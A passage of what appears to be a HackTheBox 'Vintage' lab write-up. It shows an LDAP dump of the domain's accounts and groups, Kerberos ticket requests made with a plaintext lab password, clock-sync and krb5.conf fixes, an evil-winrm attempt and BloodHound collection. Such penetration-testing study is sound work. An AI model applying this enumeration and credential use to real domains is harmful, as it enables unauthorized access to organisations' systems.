msDFSR-StagingPath: C:\Windows\SYSVOL\staging areas\vintage.htb
msDFSR-Enabled: TRUE
msDFSR-Options: 0
msDFSR-ContentSetGuid:: /3la4suYB0eDua6B7j55OQ==
msDFSR-ReplicationGroupGuid:: 3JjScrDZFEycPRnvNj4WcQ==
msDFSR-ReadOnly: FALSE

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
objectClass: msDS-GroupManagedServiceAccount
cn: gMSA01
distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605104148.0Z
whenChanged: 20241228181034.0Z
uSNCreated: 12773
uSNChanged: 114984
name: gMSA01
objectGUID:: DeLg9aqRDUyCwv00PDraCw==
userAccountControl: 4096
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842594900989
lastLogoff: 0
lastLogon: 133798836056619890
localPolicyFlags: 0
pwdLastSet: 133798824661150889
primaryGroupID: 515
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6UwQAAA==
accountExpires: 9223372036854775807
logonCount: 70
sAMAccountName: gMSA01$
sAMAccountType: 805306369
dNSHostName: gmsa01.vintage.htb
objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat
 ion,DC=vintage,DC=htb
isCriticalSystemObject: FALSE
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798830346151123
msDS-SupportedEncryptionTypes: 28
msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAagEAABwAAAAQAAAA12QUP3tQnphfSpPjJFFN8
 QAAAAAYAAAAGAAAAHYAaQBuAHQAYQBnAGUALgBoAHQAYgAAAHYAaQBuAHQAYQBnAGUALgBoAHQAYg
 AAAA==
msDS-ManagedPasswordPreviousId:: AQAAAEtEU0sCAAAAagEAABoAAAAIAAAA12QUP3tQnphfS
 pPjJFFN8QAAAAAYAAAAGAAAAHYAaQBuAHQAYQBnAGUALgBoAHQAYgAAAHYAaQBuAHQAYQBnAGUALg
 BoAHQAYgAAAA==
msDS-ManagedPasswordInterval: 30
msDS-GroupMSAMembership:: AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABAAs
 AAEAAAAAACQA/wEPAAEFAAAAAAAFFQAAAKGF3u+yJDN5jY6EegMCAAA=

# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: fs01
distinguishedName: CN=fs01,CN=Computers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605111550.0Z
whenChanged: 20241228173431.0Z
uSNCreated: 12812
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 114961
name: fs01
objectGUID:: U0ccT+TJ606dojJ8+IJxQA==
userAccountControl: 4096
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842594900989
lastLogoff: 0
lastLogon: 133798810478026131
localPolicyFlags: 0
pwdLastSet: 133620597509016974
primaryGroupID: 515
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6VAQAAA==
accountExpires: 9223372036854775807
logonCount: 66
sAMAccountName: FS01$
sAMAccountType: 805306369
dNSHostName: FS01.vintage.htb
servicePrincipalName: RestrictedKrbHost/fs01
servicePrincipalName: HOST/fs01
servicePrincipalName: RestrictedKrbHost/FS01.vintage.htb
servicePrincipalName: HOST/FS01.vintage.htb
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: FALSE
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798808718025923

# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: M.Rossi
distinguishedName: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20241113141630.0Z
uSNCreated: 12903
uSNChanged: 77865
name: M.Rossi
objectGUID:: TzuyPrLoEUiDT+VILZOcfg==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842595682259
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133620678680942343
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6VwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: M.Rossi
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141630.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-SupportedEncryptionTypes: 0

# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: R.Verdi
distinguishedName: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20241113141639.0Z
uSNCreated: 12909
uSNChanged: 77867
name: R.Verdi
objectGUID:: Gr8GPFGo6kq8cQSdt5gVkg==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842598651079
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133620678681410987
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6WAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: R.Verdi
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141639.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-SupportedEncryptionTypes: 0

# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: L.Bianchi
distinguishedName: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20241113141616.0Z
uSNCreated: 12915
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 77861
name: L.Bianchi
objectGUID:: Vb0dPNuVKEmTPnsXrG2qOw==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842595370012
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133620678681723048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6WQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: L.Bianchi
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141616.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-SupportedEncryptionTypes: 0

# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: G.Viola
distinguishedName: CN=G.Viola,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20241113141646.0Z
uSNCreated: 12921
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
uSNChanged: 77869
name: G.Viola
objectGUID:: YKS4LuLTYUew9Qt+o1+G+g==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842595370012
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133620678682036145
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6WgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: G.Viola
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141646.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-SupportedEncryptionTypes: 0

# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: C.Neri
distinguishedName: CN=C.Neri,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20241228183059.0Z
uSNCreated: 12927
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 115008
name: C.Neri
objectGUID:: dFBuSKLGb0e0ulyKkl735g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133798808717557228
lastLogoff: 0
lastLogon: 133798845528338560
pwdLastSet: 133620952935047186
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6WwQAAA==
accountExpires: 9223372036854775807
logonCount: 44
sAMAccountName: C.Neri
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141704.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798842594900989
msDS-SupportedEncryptionTypes: 0

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: P.Rosa
distinguishedName: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605133108.0Z
whenChanged: 20241228171904.0Z
uSNCreated: 12933
uSNChanged: 114949
name: P.Rosa
objectGUID:: uEHT9l86WUeWmB0wl0fj9w==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133798842597401043
lastLogoff: 0
lastLogon: 133799352860526215
pwdLastSet: 133753696369681688
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6XAQAAA==
accountExpires: 9223372036854775807
logonCount: 6
sAMAccountName: P.Rosa
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241106122627.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798799442088561
msDS-SupportedEncryptionTypes: 0

# Pre-Migration, vintage.htb
dn: OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: organizationalUnit
ou: Pre-Migration
distinguishedName: OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605183459.0Z
whenChanged: 20240605183459.0Z
uSNCreated: 12960
uSNChanged: 12962
name: Pre-Migration
objectGUID:: /znCr2aTMEWNcP+vjb+YWA==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=vintage,D
 C=htb
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 16010101000000.0Z

# IT, Pre-Migration, vintage.htb
dn: CN=IT,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: IT
distinguishedName: CN=IT,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605184030.0Z
whenChanged: 20240605184030.0Z
uSNCreated: 12977
uSNChanged: 12977
name: IT
objectGUID:: SD0mbF/vMUKSkETXlygrDQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6YAQAAA==
sAMAccountName: IT
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# HR, Pre-Migration, vintage.htb
dn: CN=HR,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: HR
distinguishedName: CN=HR,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605184034.0Z
whenChanged: 20240605184034.0Z
uSNCreated: 12981
uSNChanged: 12981
name: HR
objectGUID:: Z0yOI0cipEW7Byav44NArw==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6YQQAAA==
sAMAccountName: HR
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# Finance, Pre-Migration, vintage.htb
dn: CN=Finance,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Finance
distinguishedName: CN=Finance,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605184211.0Z
whenChanged: 20240605184211.0Z
uSNCreated: 12985
uSNChanged: 12985
name: Finance
objectGUID:: 5k6zSrwQa0mFCFQvAjA8gQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6YgQAAA==
sAMAccountName: Finance
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# ServiceAccounts, Pre-Migration, vintage.htb
dn: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: ServiceAccounts
member: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
member: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
member: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
distinguishedName: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605203608.0Z
whenChanged: 20240606135400.0Z
uSNCreated: 13016
uSNChanged: 20635
name: ServiceAccounts
objectGUID:: XsWtNFHy7UCdptT4SrZ3cA==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6YwQAAA==
sAMAccountName: ServiceAccounts
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# DelegatedAdmins, Pre-Migration, vintage.htb
dn: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: DelegatedAdmins
member: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
member: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605211118.0Z
whenChanged: 20241228193203.0Z
uSNCreated: 13111
uSNChanged: 115073
name: DelegatedAdmins
objectGUID:: bJbMTrIPNUGmDz0qJAWCnQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6awQAAA==
sAMAccountName: DelegatedAdmins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240607110025.0Z
dSCorePropagationData: 20240607105856.0Z
dSCorePropagationData: 20240607105842.0Z
dSCorePropagationData: 20240605211508.0Z
dSCorePropagationData: 16010101000000.0Z

# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_sql
distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240606134527.0Z
whenChanged: 20241229083203.0Z
uSNCreated: 20586
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
uSNChanged: 115326
name: svc_sql
objectGUID:: ARW0P0JnWEK/vmAsOoqlQw==
userAccountControl: 4260354
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133622224837626680
lastLogoff: 0
lastLogon: 133798874965682230
pwdLastSet: 133799347239432230
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6bgQAAA==
accountExpires: 9223372036854775807
logonCount: 4
sAMAccountName: svc_sql
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141743.0Z
dSCorePropagationData: 20240606141518.0Z
dSCorePropagationData: 20240606141326.0Z
dSCorePropagationData: 20240606141213.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798837388027358
msDS-SupportedEncryptionTypes: 0

# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_ldap
distinguishedName: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240606134527.0Z
whenChanged: 20241228182218.0Z
uSNCreated: 20591
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
uSNChanged: 115005
name: svc_ldap
objectGUID:: dLGQO4scl02UVcqttBwrMA==
userAccountControl: 4260352
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133798808734119897
lastLogoff: 0
lastLogon: 133798842599432384
pwdLastSet: 133621551278818297
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6bwQAAA==
accountExpires: 9223372036854775807
logonCount: 3
sAMAccountName: svc_ldap
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141738.0Z
dSCorePropagationData: 20240606142251.0Z
dSCorePropagationData: 20240606142243.0Z
dSCorePropagationData: 20240606142243.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798837384276289
msDS-SupportedEncryptionTypes: 0

# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_ark
distinguishedName: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240606134527.0Z
whenChanged: 20241113141749.0Z
uSNCreated: 20597
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
uSNChanged: 77882
name: svc_ark
objectGUID:: DDeSyRC19U+zv+63Fhg4RQ==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842598651079
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133621551279130951
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6cAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: svc_ark
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141749.0Z
dSCorePropagationData: 20240606141530.0Z
dSCorePropagationData: 20240606135231.0Z
dSCorePropagationData: 20240606134950.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-SupportedEncryptionTypes: 0

# ServiceManagers, Pre-Migration, vintage.htb
dn: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: ServiceManagers
member: CN=C.Neri,CN=Users,DC=vintage,DC=htb
member: CN=G.Viola,CN=Users,DC=vintage,DC=htb
member: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240606135115.0Z
whenChanged: 20241228183201.0Z
uSNCreated: 20613
uSNChanged: 115026
name: ServiceManagers
objectGUID:: 25BpV94WXkWjKW8hEUTe5Q==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6cQQAAA==
sAMAccountName: ServiceManagers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240606141729.0Z
dSCorePropagationData: 20240606135210.0Z
dSCorePropagationData: 16010101000000.0Z

# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: C.Neri_adm
distinguishedName: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240607105413.0Z
whenChanged: 20241228191030.0Z
uSNCreated: 49303
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 115041
name: C.Neri_adm
objectGUID:: eSTqjl7M1U2EuVYRuYaLrA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133798842595370012
lastLogoff: 0
lastLogon: 133798874836775954
pwdLastSet: 133622312540017707
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6dAQAAA==
accountExpires: 9223372036854775807
logonCount: 15
sAMAccountName: C.Neri_adm
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113141658.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798866307400987
msDS-SupportedEncryptionTypes: 0

# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: L.Bianchi_adm
distinguishedName: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240607105440.0Z
whenChanged: 20241228192522.0Z
uSNCreated: 49309
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
uSNChanged: 115070
name: L.Bianchi_adm
objectGUID:: aHkxylFOWEKDLnKTasq9og==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133798842596150981
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133770948304331225
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6dQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: L.Bianchi_adm
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20241113142911.0Z
dSCorePropagationData: 20241113141623.0Z
dSCorePropagationData: 20240608115138.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133798875225213520
msDS-SupportedEncryptionTypes: 0

# BCKUPKEY_351774c3-74aa-415c-9022-e8d63e1d5cdc Secret, System, vintage.htb
dn: CN=BCKUPKEY_351774c3-74aa-415c-9022-e8d63e1d5cdc Secret,CN=System,DC=vinta
 ge,DC=htb

# BCKUPKEY_P Secret, System, vintage.htb
dn: CN=BCKUPKEY_P Secret,CN=System,DC=vintage,DC=htb

# BCKUPKEY_709fdaa7-e5fe-45d4-b453-555506f0d4f0 Secret, System, vintage.htb
dn: CN=BCKUPKEY_709fdaa7-e5fe-45d4-b453-555506f0d4f0 Secret,CN=System,DC=vinta
 ge,DC=htb

# BCKUPKEY_PREFERRED Secret, System, vintage.htb
dn: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=vintage,DC=htb

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 269
# numEntries: 265
# numReferences: 3
```

</details>

### 2.3. Attempting Kerberos

Attempting to get TGT resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:

```console
root@kali:~# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Let's sync the time on Kali with the target

Install `ntpdate`: `apt -y install ntpdate`

Turns out the time on Kali was 898 seconds ahead of the target

```console
root@kali:~# ntpdate -q dc01.vintage.htb
2024-12-29 16:33:43.529641 (+0800) -898.809068 +/- 0.002711 dc01.vintage.htb s1 no-leap
```

Disable NTP on Kali and sync the time with the target

```console
root@kali:~# timedatectl set-ntp 0

root@kali:~# ntpdate dc01.vintage.htb
2024-12-29 16:34:22.730475 (+0800) -898.822663 +/- 0.002488 dc01.vintage.htb s1 no-leap
CLOCK: time stepped by -898.822663

root@kali:~# ntpdate -q dc01.vintage.htb
2024-12-29 16:34:40.387062 (+0800) +0.369112 +/- 0.372150 dc01.vintage.htb s1 no-leap
```

`getTGT` works after the time sync

```console
root@kali:~# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in P.Rosa.ccache

root@kali:~# export KRB5CCNAME=P.Rosa.ccache
```

The KDC for `vintage.htb` could not be located:

```console
root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Cannot find KDC for realm "VINTAGE.HTB"


Error: Exiting with code 1
```

Create `/etc/krb5.conf` to point to `dc01.vintage.htb` as KDC

```sh
cat << EOF > /etc/krb5.conf
[libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }
[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
EOF
```

Slightly different error now:

```console
root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success


Error: Exiting with code 1
malloc(): unaligned fastbin chunk detected
Aborted
```

## 3. Active Directory discovery: Bloodhound

Let's figure out if there are any viable lateral movement pathways

### 3.1. Generating bloodhound packages

```console
root@kali:~# bloodhound-python -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 -c all  --dns-tcp --zip
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The DNS query name does not exist: FS01.vintage.htb.
INFO: Done in 00M 01S
INFO: Compressing output into 20241229164901_bloodhound.zip
```
